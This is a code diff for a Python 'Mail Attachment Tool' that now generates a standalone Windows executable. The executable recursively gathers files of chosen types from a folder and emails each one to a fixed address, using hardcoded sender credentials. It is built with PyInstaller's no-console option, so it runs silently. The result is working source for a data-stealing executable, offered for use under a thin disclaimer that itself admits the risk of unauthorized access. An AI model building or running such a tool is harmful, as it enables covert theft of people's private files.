@@ -1,59 +1,110 @@
+#######################################################################################
+# Mail Attachment Tool
+# Developed by: ugurcomptech
+# License: 
+
+# WARNING: This tool can potentially be misused for malicious purposes and may lead to
+# unauthorized access to other people's important data. Use it responsibly and only with
+# the consent of the recipient for legitimate purposes.
+
+# Disclaimer: The developer is not responsible for any misuse or damage caused by this tool.
+#######################################################################################
+
 import os
 import glob
 import yagmail
 import argparse
-import signal
-import sys
 
 def send_email(sender_email, sender_password, receiver_email, subject, body, attachment_path):
     try:
-        # Yagmail istemciyi oluşturalım
+        # Create the Yagmail client
         yag = yagmail.SMTP(sender_email, sender_password)
 
-        # E-posta gönderme işlemi
+        # Send the email
         yag.send(
             to=receiver_email,
             subject=subject,
             contents=body,
             attachments=attachment_path,
         )
-        print(f"E-posta {attachment_path} başarıyla gönderildi.")
-        # Yagmail istemciyi kapat
+        print(f"Email sent successfully to {attachment_path}.")
+        # Close the Yagmail client
         yag.close()
     except Exception as e:
-        print(f"Hata oluştu: {e}")
-
-def signal_handler(sig, frame):
-    print("\nTarama işlemi durduruldu.")
-    sys.exit(0)
+        print(f"An error occurred: {e}")
 
 if __name__ == "__main__":
-    # Ctrl+C tuş kombinasyonunu ele almak için signal sinyalini tanımlayalım
-    signal.signal(signal.SIGINT, signal_handler)
-
-    # Argümanları işlemek için argparse nesnesi oluşturalım
-    parser = argparse.ArgumentParser(description="Bilgisayarınızdaki dosyaları e-postayla gönderin.")
-    parser.add_argument("-s", "--sender-email", required=True, help="E-posta gönderenin e-posta adresi.")
-    parser.add_argument("-p", "--sender-password", required=True, help="E-posta gönderenin e-posta şifresi.")
-    parser.add_argument("-r", "--receiver-email", required=True, help="Dosyaların gönderileceği alıcı e-posta adresi.")
-    parser.add_argument("-d", "--folder-path", required=True, help="Dosyaların taramasını istediğiniz klasörün yolunu girin (örn: C:\\my_folder).")
+    # Create an argparse object to handle the arguments
+    parser = argparse.ArgumentParser(description="Send files from your computer via email.", add_help=True)
+    parser.add_argument("-s", "--sender-email", required=True, help="The sender's email address.")
+    parser.add_argument("-p", "--sender-password", required=True, help="The sender's email password.")
+    parser.add_argument("-r", "--receiver-email", required=True, help="The recipient's email address.")
+    parser.add_argument("-d", "--folder-path", required=True, help="The path to the folder you want to scan (e.g., C:\\my_folder).")
     parser.add_argument("-f", "--file-extensions", nargs="+", required=True,
-                        help="Taramak istediğiniz dosya uzantılarını boşluklarla ayrılarak girin (örn: pdf jpg png)")
+                        help="The file extensions you want to scan, separated by spaces (e.g., pdf jpg png)")
+    parser.add_argument("-n", "--exe-name", required=True, help="The name of the generated exe file.")
 
     args = parser.parse_args()
 
-    # Belirtilen klasördeki dosyaları ve alt klasörlerdeki dosyaları tarayalım
+    # Determine the name of the exe file
+    exe_name = args.exe_name
+
+    # Create the embedded code to be placed in the exe file
+    embedded_code = f"""
+import os
+import glob
+import yagmail
+from getpass import getpass
+
+def send_email(sender_email, sender_password, receiver_email, subject, body, attachment_path):
+    try:
+        # Create the Yagmail client
+        yag = yagmail.SMTP(sender_email, sender_password)
+
+        # Send the email
+        yag.send(
+            to=receiver_email,
+            subject=subject,
+            contents=body,
+            attachments=attachment_path,
+        )
+        print(f"Email sent successfully to {{attachment_path}}.")
+        # Close the Yagmail client
+        yag.close()
+    except Exception as e:
+        print(f"An error occurred: {{e}}")
+
+if __name__ == "__main__":
+    # Define the email account information
+    sender_email = "{args.sender_email}"
+    sender_password = "{args.sender_password}"
+    receiver_email = "{args.receiver_email}"
+
+    # Scan files in the specified folder and subfolders
     attachment_files = []
-    for extension in args.file_extensions:
-        attachment_files.extend(glob.glob(os.path.join(args.folder_path, f"**/*.{extension}"), recursive=True))
+    for extension in {args.file_extensions}:
+        attachment_files.extend(glob.glob(os.path.join("{args.folder_path}", f"**/*." + extension), recursive=True))
 
-    # E-posta konusu ve içeriğini belirleyelim
-    subject = "Dosyalarınız Ektedir"
-    body = "İşte dosyalarınız."
+    # Define the email subject and body
+    subject = "Your Files Are Attached"
+    body = "Here are your files."
 
-    # E-posta gönderme işlemlerini tamamlayalım
+    # Complete the email sending process
     for attachment_file in attachment_files:
-        # E-posta gönderme işlemini çağıralım
-        send_email(args.sender_email, args.sender_password, args.receiver_email, subject, body, attachment_file)
+        # Call the function to send the email
+        send_email(sender_email, sender_password, receiver_email, subject, body, attachment_file)
 
-    print("E-postalar gönderildi.")
+    print("Emails sent successfully.")
+"""
+
+    # Embed the code into the exe file
+    with open(exe_name + ".py", "w", encoding="utf-8") as exe_file:
+        exe_file.write(embedded_code)
+
+    # Create the exe file
+    os.system(f"pyinstaller --onefile --noconsole {exe_name}.py")
+
+    # Remove the unnecessary python file that was created
+    os.remove(f"{exe_name}.py")
+
+    print(f"'{exe_name}.exe' file is created and code is embedded.")
